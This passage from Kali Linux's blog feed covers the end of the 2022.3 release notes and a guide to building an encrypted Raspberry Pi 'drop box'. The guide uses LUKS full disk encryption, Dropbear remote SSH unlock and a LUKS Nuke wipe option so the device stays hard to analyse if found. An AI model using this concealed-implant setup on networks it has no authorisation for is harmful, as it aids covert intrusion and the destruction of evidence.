2022.04 u-boot release.</li> </ul> <h2 id="kali-documentation-updates">Kali Documentation Updates</h2> <p>There has been a number of new pages added to our kali-docs sub section, as well as numerous updates to existing pages, keeping them up-to-date as well as adding more details. A summary of the new pages added:</p> <ul> <li><a href="https://www.kali.org/docs/arm/radxa-zero-emmc/">Radxa Zero (eMMC)</a></li> <li><a href="https://www.kali.org/docs/arm/radxa-zero-sdcard/">Radxa Zero (sdcard)</a></li> <li><a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w-p4wnp1-aloa/">Raspberry Pi Zero W P4wnP1 A.L.O.A (A Little Offensive Application)</a></li> <li><a href="https://www.kali.org/docs/cloud/linode/">Linode</a></li> <li><a href="https://www.kali.org/docs/containers/using-kali-podman-images/">Using Kali Linux Podman Images</a></li> <li><a href="https://www.kali.org/docs/installation/barebone-kali/">Bare-bones Kali</a></li> <li><a href="https://www.kali.org/docs/troubleshooting/download-speed-issues/">Discovering Problems With Download Speed</a></li> <li><a href="https://www.kali.org/docs/troubleshooting/no-sound/">No sound on Kali 2022.2</a></li> <li><a href="https://www.kali.org/docs/usb/boot-usb-in-virtualbox/">USB Boot in VirtualBox</a></li> <li><a href="https://www.kali.org/docs/virtualization/import-premade-virtualbox/">Import Pre-Made Kali VirtualBox VM</a></li> <li><a href="https://www.kali.org/docs/virtualization/import-premade-vmware/">Import Pre-Made Kali VMware VM</a></li> <li><a href="https://www.kali.org/docs/virtualization/improving-vm-performance-vmware/">Improving Virtual Machine Performance for VMware</a></li> <li><a href="https://www.kali.org/docs/virtualization/install-hyper-v-guest-vm/">Kali inside Hyper-V (Guest VM)</a></li> <li><a href="https://www.kali.org/docs/virtualization/install-qemu-guest-vm/">Kali inside QEMU/LibVirt with virt-manager (Guest VM)</a></li> <li><a href="https://www.kali.org/docs/virtualization/install-utm-guest-vm/">Kali inside UTM (Guest VM)</a></li> <li><a href="https://www.kali.org/docs/virtualization/install-vagrant-guest-vm/">Kali inside Vagrant (Guest VM)</a></li> <li><a href="https://www.kali.org/docs/virtualization/install-vmware-silicon-host/">Installing VMware on Apple Silicon (M1/M2) Macs (Host)</a></li> </ul> <h3 id="kali-tools-documentation">Kali Tools Documentation</h3> <p>A little off-topic, but also worth mentioning. Kali-docs is our documentation of Kali as an operating system. Kali-tools is our documentation for the tools inside of Kali. We have also opened up the <a href="https://gitlab.com/kalilinux/documentation/kali-tools">kali-tools repository</a>, allowing for community contributions as well.</p> <p>We will be updating this on a frequent basis. But you can help speed this up! Our goal is to have general information about every tool, as well as examples of the tool being used, and how to use the tool. <strong>If you want to get involved with Kali Linux, this is a great way to</strong>!</p> <p>We are after any media format possible, <strong>text, images, and videos</strong> (<a href="https://asciinema.org/">asciinema</a> is our preferred option for videos rather than Vimeo/YouTube).</p> <p><em>Please note, if there is too much &ldquo;self-promotion&rdquo;, submissions will be declined.</em></p> <h2 id="kali-blog-recap">Kali Blog Recap</h2> <p>In case you missed our recent <a href="https://www.kali.org/blog/">blog posts</a>, here&rsquo;s what you missed:</p> <ul> <li><a href="https://www.kali.org/blog/kali-and-linode/">Kali Linux in Linode&rsquo;s Cloud</a></li> <li><a href="https://www.kali.org/blog/secure-kali-raspberry-pi/">Secure Kali Pi (2022)</a></li> <li><a href="https://www.kali.org/blog/kali-vm-builder-weekly/">Weekly Virtual Machines, with Build Scripts</a></li> </ul> <p><em>If you would like them straight to your e-mail inbox, sign up to the <a href="https://www.kali.org/newsletter/">newsletter</a>.</em></p> <h2 id="community-shout-outs">Community Shout-Outs</h2> <p>In this last quarter, there have been multiple contributions from a number of people (the joy of <a href="https://www.kali.org/docs/policy/kali-linux-open-source-policy/">Kali Linux being open-source</a>). We do thank you guys! A few of these people&rsquo;s actions have helped make a significant improvement to Kali, so we want to call them out:</p> <ul> <li><a href="https://blog.cloudflare.com/cloudflare-repositories-ftw/">Cloudflare</a>&rsquo;s Jade Wang who has been working on some behind the scene stuff for us</li> <li><a href="https://gitlab.com/fastlorenzo">Lorenzo Bernardi</a> for helping with Azure <em>(Yes, it&rsquo;s coming back soon&hellip;)</em></li> <li><a href="https://gitlab.com/markeganfuller">Mark Egan-Fuller</a> and <a href="https://gitlab.com/elreydetoda">elrey (alex)</a> for helping get a QEMU Vagrant image building - go <a href="https://app.vagrantup.com/kalilinux/boxes/rolling">check it out</a>!</li> </ul> <p>Anyone can help out, anyone can get <a href="https://www.kali.org/docs/community/contribute/">involved</a>! And, in case you didn&rsquo;t know, you can always follow how Kali is going by checking out the <a href="https://gitlab.com/groups/kalilinux/-/activity">activity</a> page of our GitLab!</p> <hr> <h2 id="get-kali-linux-20223">Get Kali Linux 2022.3</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Go <a href="https://www.kali.org/get-kali/">get Kali</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release and you want the latest packages <em>(or bug fixes)</em> when you download the image, you can just use the weekly image instead. This way you will have fewer updates to do. <em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">release images</a></em>. But we gladly take <a href="https://bugs.kali.org/">bug reports</a> about those images because we want any issues to be fixed before our next release!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade +--(kali?kali)-[~] +-$ cp -rbi /etc/skel/. ~ +--(kali?kali)-[~] +-$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2022.3 We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2022.3&quot; VERSION_ID=&quot;2022.3&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP PREEMPT_DYNAMIC Debian 5.18.5-1kali6 (2022-07-07) +--(kali?kali)-[~] +-$ uname -r 5.18.0-kali5-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We will never be able to fix what we do not know is broken!</em> <strong>And <a href="https://twitter.com/kalilinux">Twitter</a> is not a Bug Tracker!</strong></p> <p>Want to keep in up-to-date easier? We have a <a href="https://www.kali.org/rss.xml">RSS feeds</a> and <a href="https://www.kali.org/newsletter/">newsletter</a> of our <a href="https://www.kali.org/blog/">blog</a>!</p></description>
</item>
<item>
<title>Secure Kali Pi (2022)</title>
<link>https://www.kali.org/blog/secure-kali-raspberry-pi/</link>
<guid isPermaLink="true">https://www.kali.org/blog/secure-kali-raspberry-pi/</guid>
<pubDate>Tue, 02 Aug 2022 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/secure-kali-raspberry-pi/images/secure-kali-pi-2022-banner.jpg" type="image/jpg"/>
<description><p>This is the first part of a 3 part series of blog posts surrounding Kali usage on Raspberry Pi devices. This first post will cover enabling Full Disk Encryption (FDE) on a Raspberry Pi, part two will cover remotely connecting to it, and finally, part three will cover debugging issues we ran into while making these posts, so others can learn how to do so as well.</p> <hr> <p>With everything that has been going on in the world in the last few years, more people are working remotely. We are no exception to this, and today, we are going to be revisiting our &ldquo;drop box&rdquo; machine, which has been encrypted thus making it harder to identify <em>if discovered</em>.</p> <p>The goal is to create a stand-alone &ldquo;leave behind&rdquo; <strong>headless</strong> device that, that if/when discovered, does not make it easy to figure out what we were doing as <strong>our data is secure</strong> at all times. To accomplish this, we will use Full Disk Encryption (FDE), and allow for it to be <strong>remotely unlocked</strong> (should the device get restarted for any reason). There will be the option as well to use <a href="https://www.kali.org/blog/nuke-kali-linux-luks/"><strong>LUKS Nuke</strong></a> capability should we wish to make the disk inaccessible at any point after we are done with it. We will be doing this on a <a href="https://www.kali.org/docs/arm/raspberry-pi-4/">Raspberry Pi 4 Model B+</a>, but it also has been tested on a <a href="https://www.kali.org/docs/arm/raspberry-pi-3/">Raspberry Pi 3 Model B</a> as well. <em>You should be able to use most makes/models of similar devices, it may just require a bit of creative adaptations/adjustments in order to secure your own system.</em></p> <p>This is an updated process as we have <a href="https://www.kali.org/blog/secure-kali-pi-2018/">previously covered</a> part of this before. This time we include additional developments, with some community contributions thrown in. We would like to give a shout-out to Richard Nelson (<a href="https://github.com/unixabg">@unixabg</a>) for his <a href="https://www.kali.org/blog/secure-kali-raspberry-pi/#automate">automated script</a>. We will touch on this after going through the manual method, as we always recommend you understand what is going on under the hood.</p> <hr> <h2 id="higher-level-overview">Higher-level overview</h2> <p>Before we dive into the lower-levels of technical details of what we are going to accomplish, let&rsquo;s take a quick look at our goals that we want to achieve, and break it down:</p> <ul> <li><a href="https://www.kali.org/blog/secure-kali-raspberry-pi/#installing-kali-linux-on-a-rpi">Install Kali Linux</a> on a <a href="https://www.kali.org/docs/arm/raspberry-pi-4/">Raspberry Pi 4</a> (henceforth called &ldquo;RPi&rdquo;)</li> <li><a href="https://www.kali.org/blog/secure-kali-raspberry-pi/#preparing-the-system">Prepare the system</a> for encrypted boot ready for remote disk unlock</li> <li><a href="https://www.kali.org/blog/secure-kali-raspberry-pi/#configuring-remote-ssh-unlock">Setup SSH keys</a> to allow the remote unlock to occur (using initramfs and Dropbear)</li> <li><a href="https://www.kali.org/blog/secure-kali-raspberry-pi/#backup-any-existing-data">Backup</a> any existing data</li> <li><a href="https://www.kali.org/blog/secure-kali-raspberry-pi/#configuring-for-encryption">Configure</a> the encrypted partitions</li> <li><a href="https://www.kali.org/blog/secure-kali-raspberry-pi/#restore-our-data">Restore</a> our data</li> <li><strong>Hack away</strong>!</li> </ul> <p>This might sound like a lot, but it&rsquo;s rather straightforward even if there are a fair few steps. Once completed, we will have a RPi that will:</p> <ul> <li>Boot</li> <li>Get an IP from DHCP</li> <li>Wait for us to connect via SSH using keys</li> <li>Allow us to provide either the LUKS unlock, or LUKS Nuke passphrases</li> </ul> <p>Then down the road when we are done with whatever it is we are wanting to do, the only thing left is to retrieve it &hellip;at our leisure!</p> <hr> <h2 id="installing-kali-linux-on-a-rpi">Installing Kali Linux on a RPi</h2> <div class="notices info"> <p data-header="Info"> If you&rsquo;re following along, be sure to know where you are imaging the file to, and replace <code>/dev/sdX</code>. Don&rsquo;t blindly copy/paste! </p> </div> <p>We will be creating our drop box machine on an existing Kali installation. It should be very easy to use other Debian-based distributions, and pretty straight forward for other OSes (except Windows users!)</p> <p>We first will <a href="https://www.kali.org/get-kali/#kali-arm">download</a> the <a href="https://www.kali.org/releases/">latest stable</a> Kali RPi image. At the time of writing, that&rsquo;s <a href="https://www.kali.org/blog/kali-linux-2022-2-release/">Kali 2022.2</a>. We have also chosen the 64-bit image, as we have more than 4GB of RAM, and are not using any <a href="https://www.raspberrypi.com/news/introducing-raspberry-pi-hats/">HATs</a> (Hardware Attached on Top). The steps for 32-bit would be the same, after adjusting filenames:</p> <pre><code class="language-console">$ wget https://kali.download/arm-images/kali-2022.2/kali-linux-2022.2-raspberry-pi-arm64.img.xz $ xzcat kali-linux-2022.2-raspberry-pi-arm64.img.xz | sudo dd of=/dev/sdX bs=512k status=progress </code></pre> <hr> <h2 id="preparing-the-system">Preparing the system</h2> <h3 id="preparing-the-chroot">Preparing the chroot</h3> <p>We next are going to get things ready for a chroot. Let&rsquo;s create where we want to mount the microSD card, then mount it:</p> <pre><code class="language-console">$ sudo mkdir -vp /mnt/chroot/ $ sudo mount /dev/sdX2 /mnt/chroot/ $ sudo mount /dev/sdX1 /mnt/chroot/boot/ $ sudo mount -t proc none /mnt/chroot/proc $ sudo mount -t sysfs none /mnt/chroot/sys $ sudo mount -o bind /dev /mnt/chroot/dev $ sudo mount -o bind /dev/pts /mnt/chroot/dev/pts $ sudo apt install -y qemu-user-static $ sudo cp /usr/bin/qemu-aarch64-static /mnt/chroot/usr/bin/ </code></pre> <p>The last two commands will come in handy ready for initramfs later.</p> <hr> <h3 id="installing-required-packages">Installing required packages</h3> <p>Now that our system is set up we can use the chroot to set up the RPi image for encryption. Let&rsquo;s first enter the chroot and install some necessary packages:</p> <pre><code class="language-console">$ sudo env LANG=C chroot /mnt/chroot/ +--(root?kali)-[/] +-# apt update +--(root?kali)-[/] +-# apt install -y busybox cryptsetup dropbear-initramfs lvm2 </code></pre> <hr> <p>We want to ensure we are on the latest kernel before we get started, so lets also make sure we have them installed:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# apt install -y kalipi-kernel kalipi-bootloader kalipi-re4son-firmware </code></pre> <hr> <h3 id="boot-options">Boot options</h3> <p>Next we are going to edit <code>/boot/cmdline.txt</code> and change the root path. The <code>/boot/cmdline.txt</code> file on a RPi device is used to pass the kernel command line options. We will want to change the root path to be <code>/dev/mapper/crypt</code>, and then we will add in <code>cryptdevice=PARTUUID=$partuuid:crypt</code> right after that.</p> <p>The reason for this is that the kernel needs to know where the root filesystem is, in order to mount it and use it, and since we are encrypting the rootfs later in the post, during boot time it can&rsquo;t see the unencrypted device either, because of the encryption! While we are changing the name here to &ldquo;crypt&rdquo;, you can call it anything you want.</p> <p>The end result should look like this:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# vim /boot/cmdline.txt +--(root?kali)-[/] +-# cat /boot/cmdline.txt dwc_otg.fiq_fix_enable=2 console=serial0,115200 kgdboc=serial0,115200 console=tty1 root=/dev/mapper/crypt cryptdevice=PARTUUID=ed889dad-02:crypt rootfstype=ext4 fsck.repair=yes rootwait net.ifnames=0 </code></pre> <hr> <h3 id="partition-layout">Partition layout</h3> <p>We now need to update the <code>/etc/fstab</code> file, this is a configuration file on the system that contains all available disks, disk partitions, and what options to use when handling them.</p> <p>Currently it is populated with the UUID of the root filesystem, and we need it to point at the encrypted filesystem that we will be making. In this example, we&rsquo;ve commented out what the previous root device&rsquo;s UUID, and point at <code>/dev/mapper/crypt</code> which is what our encrypted filesystem will mount as, once we create it:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# vim /etc/fstab +--(root?kali)-[/] +-# cat /etc/fstab # &lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt; proc /proc proc defaults 0 0 /dev/mapper/crypt / ext4 errors=remount-ro 0 0 #UUID=747bfa7c-edd2-471f-8fff-0ecafc2d3791 / ext4 errors=remount-ro 0 1 LABEL=BOOT /boot vfat defaults 0 2 </code></pre> <hr> <h3 id="configure-the-encrypted-partitions">Configure the encrypted partitions</h3> <p>When using encrypted partitions, we need to edit, or create, if it doesn&rsquo;t exist, the <code>/etc/crypttab</code> file, which is used by cryptsetup to know what options are needed in order to unlock the encrypted device.</p> <p>Because this file doesn&rsquo;t exist, we will create the <code>/etc/crypttab</code> file, and fill it with the options we need:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# echo -e 'crypt\tPARTUUID=ed889dad-02\tnone\tluks' &gt; /etc/crypttab </code></pre> <hr> <p>Now we do a little file-system trickery. We create a fake LUKS file-system which will allow cryptsetup to be included in the initramfs because it sees an encrypted partition. When you format any LUKS partitions, you will be prompted for a password, and while normally you will use a strong password, because we are only using this as a hack to include cryptsetup into our initramfs, the password you create at this prompt will not be needed or used past these steps, so you can set it to something short/quick to type. This will happen at the <code>cryptsetup luksFormat</code> step, and you will be prompted for the password you set during <code>cryptsetup luksFormat</code> when you run the <code>cryptsetup luksOpen</code> step.</p> <div class="notices info"> <p data-header="Info"> You will not see any input being typed when entering the password </p> </div> <pre><code class="language-console">+--(root?kali)-[/] +-# dd if=/dev/zero of=/tmp/fakeroot.img bs=1M count=20 +--(root?kali)-[/] +-# exit $ sudo cryptsetup luksFormat /mnt/chroot/tmp/fakeroot.img $ sudo cryptsetup luksOpen /mnt/chroot/tmp/fakeroot.img crypt $ sudo mkfs.ext4 /dev/mapper/crypt </code></pre> <hr> <h3 id="configuring-ssh-keys">Configuring SSH keys</h3> <p>After that we need to copy over OR generate a new ssh key to be added to Dropbear&rsquo;s <code>authorized_keys</code> file.</p> <p>If we already have an existing key to copy over:</p> <pre><code class="language-console">$ sudo cp ~/.ssh/id_rsa.pub /mnt/chroot/ </code></pre> <p>Alternatively to generate a new key:</p> <pre><code class="language-console">$ ssh-keygen -t rsa -b 4096 [...] Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/.ssh/id_rsa_dropbear Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/kali/.ssh/id_rsa_dropbear Your public key has been saved in /home/kali/.ssh/id_rsa_dropbear.pub [...] $ sudo cp ~/.ssh/id_rsa_dropbear.pub /mnt/chroot/ </code></pre> <div class="notices info"> <p data-header="Info"> You will not see any input being typed when entering a passphrase </p> </div> <hr> <h3 id="configuring-for-encryption">Configuring for encryption</h3> <p>Going back into the chroot, we need to create a few new files.</p> <p>First is the <code>zz-cryptsetup</code> hook which adds the files we need for <code>cryptsetup</code> into the <code>initramfs</code>. For it to work, it needs to be marked as executable so that <code>mkinitramfs</code> will run the hook:</p> <pre><code class="language-console">$ sudo env LANG=C chroot /mnt/chroot/ +--(root?kali)-[/] +-# vim /etc/initramfs-tools/hooks/zz-cryptsetup +--(root?kali)-[/] +-# cat /etc/initramfs-tools/hooks/zz-cryptsetup #!/bin/sh set -e PREREQ=&quot;&quot; prereqs() { echo &quot;${PREREQ}&quot; } case &quot;${1}&quot; in prereqs) prereqs exit 0 ;; esac . /usr/share/initramfs-tools/hook-functions mkdir -p ${DESTDIR}/cryptroot || true cat /etc/crypttab &gt;&gt; ${DESTDIR}/cryptroot/crypttab cat /etc/fstab &gt;&gt; ${DESTDIR}/cryptroot/fstab cat /etc/crypttab &gt;&gt; ${DESTDIR}/etc/crypttab cat /etc/fstab &gt;&gt; ${DESTDIR}/etc/fstab copy_file config /etc/initramfs-tools/unlock.sh /etc/unlock.sh +--(root?kali)-[/] +-# chmod +x /etc/initramfs-tools/hooks/zz-cryptsetup </code></pre> <p><em>Should you wish to disable it at any point in the future for any reason, simply remove the executable bit.</em></p> <hr> <p>We edit the modules file for <code>initramfs-tools</code> so that we include the <code>dm-crypt</code> module, and cat the file to verify it is correct:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# grep -q dm_crypt /etc/initramfs-tools/modules || echo dm_crypt &gt;&gt; /etc/initramfs-tools/modules +--(root?kali)-[/] +-# cat /etc/initramfs-tools/modules # List of modules that you want to include in your initramfs. # They will be loaded at boot time in the order below. # # Syntax: module_name [args ...] # # You must run update-initramfs(8) to effect this change. # # Examples: # # raid1 # sd_mod dm_crypt </code></pre> <hr> <h3 id="configuring-remote-ssh-unlock">Configuring remote SSH unlock</h3> <p>Create an <code>unlock.sh</code> script with the following contents, and then mark it as executable so that the script runs in the <code>initramfs</code>:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# vim /etc/initramfs-tools/unlock.sh +--(root?kali)-[/] +-# cat /etc/initramfs-tools/unlock.sh #!/bin/sh export PATH='/sbin:/bin:/usr/sbin:/usr/bin' while true; do test -e /dev/mapper/crypt &amp;&amp; break || cryptsetup luksOpen /dev/disk/by-uuid/$REPLACE_LATER crypt done /scripts/local-top/cryptroot for i in $(ps aux | grep 'cryptroot' | grep -v 'grep' | awk '{print $1}'); do kill -9 $i; done for i in $(ps aux | grep 'askpass' | grep -v 'grep' | awk '{print $1}'); do kill -9 $i; done for i in $(ps aux | grep 'ask-for-password' | grep -v 'grep' | awk '{print $1}'); do kill -9 $i; done for i in $(ps aux | grep '\\-sh' | grep -v 'grep' | awk '{print $1}'); do kill -9 $i; done exit 0 +--(root?kali)-[/] +-# chmod +x /etc/initramfs-tools/unlock.sh </code></pre> <hr> <p>Next we must add the following to the beginning of <code>/etc/dropbear/initramfs/authorized_keys</code>, which tells it to run this command when we SSH in if the key matches:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# vim /etc/dropbear/initramfs/authorized_keys +--(root?kali)-[/] +-# cat /etc/dropbear/initramfs/authorized_keys command=&quot;/etc/unlock.sh; exit&quot; </code></pre> <hr> <p>After doing so, we can append the SSH key that we copied over and then remove it from the card:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# cat id_rsa.pub &gt;&gt; /etc/dropbear/initramfs/authorized_keys &amp;&amp; rm -v id_rsa.pub </code></pre> <p>Once you&rsquo;re done, <code>/etc/dropbear/initramfs/authorized_keys</code> should look like this:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# cat /etc/dropbear/initramfs/authorized_keys command=&quot;/etc/unlock.sh; exit&quot; ssh-rsa &lt;key&gt; kali@kali </code></pre> <p>Everything in the <code>authorized_keys</code> file should be one line, as well as a space between the command&rsquo;s ending <code>&quot;</code> and the ssh key (e.g. <code>[...]exit&quot; ssh-rsa[...]</code>)</p> <hr> <p>We now need to edit <code>/usr/share/initramfs-tools/scripts/init-premount/dropbear</code> to add a sleep timer, this allows for networking to start <em>before</em> Dropbear does. It is important to note that when there are updates to the <code>dropbear-initramfs</code> package, this edit will need to be re-added:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# vim /usr/share/initramfs-tools/scripts/init-premount/dropbear +--(root?kali)-[/] +-# cat /usr/share/initramfs-tools/scripts/init-premount/dropbear [ &quot;$BOOT&quot; != nfs ] || configure_networking sleep 5 run_dropbear &amp; echo $! &gt;/run/dropbear.pid </code></pre> <hr> <p>Now we enable cryptsetup:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# echo CRYPTSETUP=y &gt;&gt; /etc/cryptsetup-initramfs/conf-hook +--(root?kali)-[/] +-# tail /etc/cryptsetup-initramfs/conf-hook # # Whether to include the askpass binary to the initramfs image. askpass # is required for interactive passphrase prompts, and ASKPASS=y (the # default) is implied when the hook detects that same device needs to be # unlocked interactively (i.e., not via keyfile nor keyscript) at # initramfs stage. Setting ASKPASS=n also skips `cryptroot-unlock` # inclusion as it requires the askpass executable. #ASKPASS=y CRYPTSETUP=y </code></pre> <hr> <h3 id="kernel">Kernel</h3> <p>The next step is important for the people who are following along. What to select, depends on the RPi device you are using, will . Below are five kernel names/editions/flavours which you need to select one of for your needs <em>(please pay attention!)</em>:</p> <ul> <li><code>Re4son+</code> is for 32-bit ARMEL armv6 devices - i.e. RPi1, RPi0, or RPi0w</li> <li><code>Re4son-v7+</code> is for 32-bit ARMHF armv7 devices - i.e. RPi2 v1.2, RPi3 or RPi02w</li> <li><code>Re4son-v8+</code> is for 64-bit ARM64 armv8 devices - i.e. RPi2 v1.2, RPi3 or RPi02w</li> <li><code>Re4son-v7l+</code> is for 32-bit ARMHF armv7 devices - i.e. RPi4 or RPi400 devices</li> <li><code>Re4son-v8l+</code> is for 64-bit ARM64 armv8 devices - i.e. RPi4 or RPi400 devices</li> </ul> <div class="notices info"> <p data-header="Info"> The <code>l</code> in the name stands for lpae - <a href="https://wikipedia.org/wiki/ARM_architecture_family#LPAE">Large Physical Address Extension</a> </p> </div> <p>As a reminder, we are using the RPi4, 64-bit image. So we would need <code>Re4son-v8l+</code>. Please make sure you adjust to your device. So now we know what kernel name to use, we now need to find what kernel version. This will alter from device to device, and it will also change as and when Kali gets updates At the time of writing, it is <code>5.15.44</code> for our RPi:</p> <p>Keep in mind the kernel versions may change, however the name will not:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# ls -l /lib/modules/ | awk -F&quot; &quot; '{print $9}' 5.15.44-Re4son+ 5.15.44-Re4son-v7+ 5.15.44-Re4son-v7l+ 5.15.44-Re4son-v8+ 5.15.44-Re4son-v8l+ +--(root?kali)-[/] +-# echo &quot;initramfs initramfs.gz followkernel&quot; &gt;&gt; /boot/config.txt </code></pre> <div class="notices info"> <p data-header="Info"> Keep in mind the kernel versions (<code>5.15.44</code>) may change, however the kernel name (<code>Re4son-v8l+</code>) will not. </p> </div> <hr> <p>Now we need to create the <code>initramfs</code>. This is where the kernel version comes into play:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# mkinitramfs -o /boot/initramfs.gz 5.15.44-Re4son-v8l+ </code></pre> <hr> <p>Now we want to ensure that we created the <code>initramfs</code> correctly. If there is no result, then something went wrong:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# lsinitramfs /boot/initramfs.gz | grep cryptsetup usr/lib/aarch64-linux-gnu/libcryptsetup.so.12 usr/lib/aarch64-linux-gnu/libcryptsetup.so.12.7.0 usr/lib/cryptsetup usr/lib/cryptsetup-nuke-password usr/lib/cryptsetup-nuke-password/crypt usr/lib/cryptsetup/askpass usr/lib/cryptsetup/askpass.cryptsetup usr/lib/cryptsetup/functions usr/sbin/cryptsetup +--(root?kali)-[/] +-# lsinitramfs /boot/initramfs.gz | grep authorized root-Q2iWOODUwk/.ssh/authorized_keys +--(root?kali)-[/] +-# lsinitramfs /boot/initramfs.gz | grep unlock.sh etc/unlock.sh </code></pre> <hr> <h3 id="disable-services">Disable services</h3> <p>Before we can backup, we have to ensure that <code>rpi-resizerootfs</code> is disabled. This is a service we typically run on all of our ARM devices that resizes the root filesystem partition to increase the size of the partition to the full size of the storage device it is on. Since we are doing this step manually, we want to disable it, so it doesn&rsquo;t potentially delete our root filesystem and re-make it:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# systemctl disable rpi-resizerootfs </code></pre> <h2 id="backup-any-existing-data">Backup any existing data</h2> <p>Now we can ensure that all the changes are written, then we can encrypt the disk:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# sync +--(root?kali)-[/] +-# exit $ sudo umount /mnt/chroot/{boot,sys,proc,dev/pts,dev} $ sudo mkdir -vp /mnt/{backup,encrypted} $ sudo rsync -avh /mnt/chroot/* /mnt/backup/ $ sudo cryptsetup luksClose crypt $ sudo umount /mnt/chroot $ echo -e &quot;d\n2\nw&quot; | sudo fdisk /dev/sdX $ echo -e &quot;n\np\n2\n\n\nw&quot; | sudo fdisk /dev/sdX </code></pre> <h2 id="configure-the-encrypted-partitions-1">Configure the encrypted partitions</h2> <p>Depending on what device you are using you will have to use one of two commands. If you are using a RPi4 with 4GB or more, use this command:</p> <pre><code class="language-console">$ sudo cryptsetup -v -y --cipher aes-cbc-essiv:sha256 --key-size 256 luksFormat /dev/sdX2 </code></pre> <p>Otherwise you will want to use the following which uses an older version of LUKS:</p> <pre><code class="language-console">$ sudo cryptsetup -v -y --pbkdf pbkdf2 --cipher aes-cbc-essiv:sha256 --key-size 256 luksFormat /dev/sdX2 </code></pre> <h2 id="restore-our-data">Restore our data</h2> <p>Afterwards you can finish restoring data back to the now encrypted partition:</p> <pre><code class="language-console">$ sudo cryptsetup -v luksOpen /dev/sdX2 crypt $ sudo mkfs.ext4 /dev/mapper/crypt $ sudo mount /dev/mapper/crypt /mnt/encrypted/ $ sudo rsync -avh /mnt/backup/* /mnt/encrypted/ $ sync </code></pre> <hr> <p>The final steps that we have to make are to fix up the <code>/etc/fstab</code> file for the new LUKS UUID, or you can leave it as <code>/dev/mapper/crypt</code> and replace the UUID in our unlock script and remake the initramfs file, this step is important as it will not properly boot if not done, because it won&rsquo;t have the information to use the encrypted filesystem! Remember to put the information in from <strong>YOUR</strong> system, as the UUID will be different for every system:</p> <pre><code class="language-console">$ sudo mount /dev/sdX1 /mnt/encrypted/boot/ $ sudo mount -t proc none /mnt/encrypted/proc $ sudo mount -t sysfs none /mnt/encrypted/sys $ sudo mount -o bind /dev /mnt/encrypted/dev $ sudo mount -o bind /dev/pts /mnt/encrypted/dev/pts $ sudo env LANG=C chroot /mnt/encrypted +--(root?kali)-[/] +-# blkid /dev/sdX2 /dev/sdX2: UUID=&quot;173e2de4-0501-4d8e-9039-a4923bfa5ee7&quot; TYPE=&quot;crypto_LUKS&quot; PARTUUID=&quot;e1750e08-02&quot; +--(root?kali)-[/] +-# cat /etc/fstab # &lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt; proc /proc proc defaults 0 0 UUID=173e2de4-0501-4d8e-9039-a4923bfa5ee7 / ext4 errors=remount-ro 0 1 LABEL=BOOT /boot vfat defaults 0 2 +--(root?kali)-[/] +-# vim /etc/initramfs-tools/unlock.sh +--(root?kali)-[/] +-# cat /etc/initramfs-tools/unlock.sh #!/bin/sh export PATH='/sbin:/bin:/usr/sbin:/usr/bin' while true; do test -e /dev/mapper/crypt &amp;&amp; break || cryptsetup luksOpen /dev/disk/by-uuid/173e2de4-0501-4d8e-9039-a4923bfa5ee7 crypt done /scripts/local-top/cryptroot for i in $(ps aux | grep 'cryptroot' | grep -v 'grep' | awk '{print $1}'); do kill -9 $i; done for i in $(ps aux | grep 'askpass' | grep -v 'grep' | awk '{print $1}'); do kill -9 $i; done for i in $(ps aux | grep 'ask-for-password' | grep -v 'grep' | awk '{print $1}'); do kill -9 $i; done for i in $(ps aux | grep '\\-sh' | grep -v 'grep' | awk '{print $1}'); do kill -9 $i; done exit 0 +--(root?kali)-[/] +-# vim /etc/crypttab +--(root?kali)-[/] +-# cat /etc/crypttab crypt PARTUUID=e1750e08-02 none luks +--(root?kali)-[/] +-# mkinitramfs -o /boot/initramfs.gz 5.15.44-Re4son-v8l+ </code></pre> <div class="notices info"> <p data-header="Info"> If you get a cryptsetup error here, similar to <code>cryptsetup: ERROR: Couldn't resolve device PARTUUID=ed889dad-02</code> that means that you did not edit the <code>/etc/crypttab</code> file and put the correct PARTUUID in. The warning about no fsck.luks existing can be ignored, as there is no such thing. </p> </div> <hr> <p>Now we can unmount and close up 